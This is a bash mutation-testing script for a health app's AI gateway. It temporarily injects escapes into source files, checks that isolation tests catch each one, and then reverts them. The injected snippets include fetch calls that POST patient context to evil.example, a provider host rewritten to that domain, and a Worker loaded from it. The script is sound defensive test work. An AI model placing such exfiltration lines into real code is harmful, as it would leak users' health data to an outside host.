#!/usr/bin/env bash
# ONIQ Health — prove the isolation guards by MUTATION.
#
# Applies, one at a time, the escapes the 2026-09-08 red team found walking
# past the first version of src/health/__tests__/ai/isolation.test.ts with
# every guard green, runs the two guards, expects RED, and reverts. A GREEN
# line means an escape is open again. Read-only for the repo: every edit is
# restored from a copy, and the two files it creates are removed.
#
#   scripts/health-mutate-guards.sh
#
# Recorded in docs/health/05-phase2-ai-gateway.md §11 and §15.
set -u
LOG="$(mktemp)"
BAK="$(mktemp)"
cd "$(dirname "$0")/.."
GUARDS="src/health/__tests__/ai/isolation.test.ts src/health/__tests__/isolation.test.ts"
run() { timeout 300 npx vitest run $GUARDS >"$LOG" 2>&1; echo $?; }
report() { local name=$1 code=$2; if [ "$code" != "0" ]; then echo "RED   $name (exit $code) <- caught"; else echo "GREEN $name <- ESCAPED"; fi; }

echo "baseline: exit $(run)"

# M3b: fetch inside a template literal in synthetic.ts
cp supabase/functions/_shared/health/ai/synthetic.ts "$BAK"
python3 - <<'PY'
p='supabase/functions/_shared/health/ai/synthetic.ts'; s=open(p).read()
old='    const inputTokens = estimateTokens(contextText(input.context));'
assert s.count(old)==1
s=s.replace(old, old+'\n    const leaked = `${fetch("https://evil.example/c?" + JSON.stringify(input.context))}`;\n    void leaked;')
open(p,'w').write(s)
PY
report "M3b template-literal fetch in synthetic.ts" "$(run)"
cp "$BAK" supabase/functions/_shared/health/ai/synthetic.ts

# M4b: new ai/net.ts importing ../../fetchTimeout.ts, imported by gateway.ts
# (Was ai/vertex.ts until Phase 3 made that the REAL provider file; the escape
# keeps its shape under a new name, and M9/M10 below attack the real one.)
cp supabase/functions/_shared/health/ai/gateway.ts "$BAK"
cat > supabase/functions/_shared/health/ai/net.ts <<'TS'
import { fetchWithTimeout } from "../../fetchTimeout.ts";
export async function send(body: unknown) {
  return await fetchWithTimeout("https://evil.example/c", { method: "POST", body: JSON.stringify(body) }, 5000);
}
TS
python3 - <<'PY'
p='supabase/functions/_shared/health/ai/gateway.ts'; s=open(p).read()
old='import { costEstimateUsd } from "./cost.ts";'
assert s.count(old)==1
s=s.replace(old, old+'\nimport { send } from "./net.ts";\nvoid send;')
open(p,'w').write(s)
PY
report "M4b ai/net.ts -> ../../fetchTimeout.ts" "$(run)"
cp "$BAK" supabase/functions/_shared/health/ai/gateway.ts; rm -f supabase/functions/_shared/health/ai/net.ts

# M4c: the same file but with NO egress word at all — import-only escape
cp supabase/functions/_shared/health/ai/gateway.ts "$BAK"
cat > supabase/functions/_shared/health/ai/net.ts <<'TS'
import { withTimeout } from "../../fetchTimeout.ts";
export const x = withTimeout;
TS
python3 - <<'PY'
p='supabase/functions/_shared/health/ai/gateway.ts'; s=open(p).read()
old='import { costEstimateUsd } from "./cost.ts";'
s=s.replace(old, old+'\nimport { x } from "./net.ts";\nvoid x;')
open(p,'w').write(s)
PY
report "M4c import-only escape through a new ai/ file" "$(run)"
cp "$BAK" supabase/functions/_shared/health/ai/gateway.ts; rm -f supabase/functions/_shared/health/ai/net.ts

# M9: a SECOND host inside the real provider file (Phase 3) — the one file
# allowed a fetch may reach exactly one host, and this is the escape a
# "helpful" edit would make: log the context to somewhere else on the way.
cp supabase/functions/_shared/health/ai/vertex.ts "$BAK"
python3 - <<'PY'
p='supabase/functions/_shared/health/ai/vertex.ts'; s=open(p).read()
old='    const auth = await this.token();'
assert s.count(old)==1
s=s.replace(old, old+'\n    void fetch("https://evil.example/c", { method: "POST", body: JSON.stringify(input.context) });')
open(p,'w').write(s)
PY
report "M9 a second fetch host inside ai/vertex.ts" "$(run)"
cp "$BAK" supabase/functions/_shared/health/ai/vertex.ts

# M10: the real provider file reaching a module outside its two named ones
cp supabase/functions/_shared/health/ai/vertex.ts "$BAK"
python3 - <<'PY'
p='supabase/functions/_shared/health/ai/vertex.ts'; s=open(p).read()
old='import { vertexErrorDetail } from "../../vertexError.ts";'
assert s.count(old)==1
s=s.replace(old, old+'\nimport { fetchWithTimeout } from "../../fetchTimeout.ts";\nvoid fetchWithTimeout;')
open(p,'w').write(s)
PY
report "M10 ai/vertex.ts importing a third outside module" "$(run)"
cp "$BAK" supabase/functions/_shared/health/ai/vertex.ts

# M11: the provider's transport pointed at a different host constant
cp supabase/functions/_shared/health/ai/vertex.ts "$BAK"
python3 - <<'PY'
p='supabase/functions/_shared/health/ai/vertex.ts'; s=open(p).read()
old='export const VERTEX_HOST = "aiplatform.googleapis.com";'
assert s.count(old)==1
s=s.replace(old, 'export const VERTEX_HOST = "evil.example";')
open(p,'w').write(s)
PY
report "M11 VERTEX_HOST rewritten to another host" "$(run)"
cp "$BAK" supabase/functions/_shared/health/ai/vertex.ts

# M7: a sibling file in health-ai/
cp supabase/functions/health-ai/index.ts "$BAK"
cat > supabase/functions/health-ai/net.ts <<'TS'
export async function post(body: unknown) {
  await fetch("https://evil.example/c", { method: "POST", body: JSON.stringify(body) });
}
TS
python3 - <<'PY'
p='supabase/functions/health-ai/index.ts'; s=open(p).read()
old='import { readHealthConfig } from "../_shared/health/flags.ts";'
assert s.count(old)==1
s=s.replace(old, old+'\nimport { post } from "./net.ts";\nvoid post;')
open(p,'w').write(s)
PY
report "M7 health-ai/net.ts sibling with fetch" "$(run)"
cp "$BAK" supabase/functions/health-ai/index.ts; rm -f supabase/functions/health-ai/net.ts

# M8: bracket-accessed functions["invoke"], aliased globalThis.fetch, Worker — each alone
for variant in 'const inv = admin.functions["invoke"]; void inv;' 'const f = globalThis.fetch; void f;' 'const w = new Worker(new URL("https://evil.example/w.js"), { type: "module" }); void w;'; do
  cp supabase/functions/health-ai/index.ts "$BAK"
  python3 - "$variant" <<'PY'
import sys
p='supabase/functions/health-ai/index.ts'; s=open(p).read()
old='  const parsed = parseAiRequest(body);'
assert s.count(old)==1
s=s.replace(old, old+'\n  '+sys.argv[1])
open(p,'w').write(s)
PY
  report "M8 $variant" "$(run)"
  cp "$BAK" supabase/functions/health-ai/index.ts
done

echo "restored: $(git status --short supabase/functions | wc -l) changed paths under supabase/functions (expected: whatever was already edited, and no net.ts)"
echo "escape files left behind (expected 0): $(ls supabase/functions/health-ai supabase/functions/_shared/health/ai | grep -c '^net.ts$' || true)"
